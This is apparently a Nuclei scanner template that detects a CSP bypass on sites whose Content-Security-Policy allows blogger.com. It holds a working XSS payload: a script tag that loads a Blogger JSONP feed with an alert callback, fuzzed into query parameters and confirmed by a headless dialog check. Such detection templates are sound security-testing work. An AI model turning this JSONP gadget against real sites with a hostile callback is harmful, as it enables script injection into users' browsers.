flow: http(1) && headless(1)
headless:
- fuzzing:
  - fuzz:
    - '{{url_encode(injection)}}'
    mode: single
    part: query
    type: replace
  matchers:
  - dsl:
    - yugiohmonstrosdeduelo_blogger_csp_xss == true
    type: dsl
  payloads:
    injection:
    - <script src="https://yugiohmonstrosdeduelo.blogspot.com/feeds/posts/summary?callback=alert"></script>
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}'
  - action: waitdialog
    args:
      max-duration: 5s
    name: yugiohmonstrosdeduelo_blogger_csp_xss
http:
- matchers:
  - condition: and
    internal: true
    part: header
    type: word
    words:
    - Content-Security-Policy
    - blogger.com
  method: GET
  path:
  - '{{BaseURL}}'
id: yugiohmonstrosdeduelo-blogger-csp-bypass
info:
  author: renniepak,DhiyaneshDK
  metadata:
    verified: true
  name: Content-Security-Policy Bypass - Yugiohmonstrosdeduelo Blogger
  reference:
  - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  severity: medium
  tags: xss,csp-bypass,yugiohmonstrosdeduelo-blogger,vuln
